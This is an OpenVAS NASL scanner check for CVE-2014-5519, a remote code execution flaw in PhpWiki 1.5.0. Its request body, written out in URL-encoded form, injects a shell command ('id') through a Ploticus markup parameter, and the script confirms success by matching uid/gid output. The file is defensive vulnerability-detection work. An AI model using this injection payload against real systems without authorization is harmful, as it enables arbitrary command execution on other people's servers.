###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpwiki_rce_08_14.nasl 2780 2016-03-04 13:12:04Z antu123 $
#
# PhpWiki Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary
commands in the context of the affected application.";

tag_affected = "PhpWiki 1.5.0; Other versions may affected as well.";
tag_summary = "PhpWiki is prone to a remote code execution vulnerability.";
tag_solution = "Ask the Vendor for an update.";
tag_vuldetect = "Send a special crafted HTTP POST request and check the response.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.105074");
 script_version ("$Revision: 2780 $");
 script_cve_id("CVE-2014-5519");
 script_bugtraq_id(69444);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("PhpWiki Remote Code Execution Vulnerability");


 script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34451/");

 script_tag(name:"last_modification", value:"$Date: 2016-03-04 14:12:04 +0100 (Fri, 04 Mar 2016) $");
 script_tag(name:"creation_date", value:"2014-08-29 11:48:21 +0200 (Fri, 29 Aug 2014)");
 script_summary("Determine if it is possible to execute a command");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "affected" , value : tag_affected);

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! get_port_state( port ) ) exit( 0 );

dirs = make_list("/phpwiki", "/wiki", cgi_dirs());

foreach dir ( dirs )
{
 url = dir + "/";
 req = http_get( item:url, port:port );
 buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

 if( "Powered by PhpWiki" >< buf )
 {
   host = get_host_name();
   ex = 'pagename=HeIp&edit%5Bcontent%5D=%3C%3CPloticus+device%3D%22%3Becho+123%27%3A%3A%3A%27+1%3E%262%3B' + 
        'id' + 
        '+1%3E%262%3Becho+%27%3A%3A%3A%27123+1%3E%262%3B%22+-prefab%3D+-csmap%3D+data%3D+alt%3D+help%3D+%3E%3E' + 
        '&edit%5Bpreview%5D=Preview&action=edit';

   len = strlen( ex );

   req = 'POST ' + dir + '/index.php HTTP/1.1\r\n' +
         'Host: ' + host + '\r\n' +
         'Accept-Encoding: identity\r\n' +
         'Content-Length: ' + len + '\r\n' + 
         'Content-Type: application/x-www-form-urlencoded\r\n' + 
         'Connection: close\r\n' + 
         'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
         '\r\n' +
         ex;

   result = http_send_recv( port:port, data:req, bodyonly:FALSE );

   if( result =~ "uid=[0-9]+.*gid=[0-9]+" )
   {
     match = egrep( pattern:"uid=[0-9]+.*gid=[0-9]+", string:result );
     send_recv = 'Request:\n' + req + '\n\nResponse:\n[...]' + match + '[...]\n';
     security_message( port:port, expert_info:send_recv );
     exit( 0 );
   }
 }

}

exit( 0 );
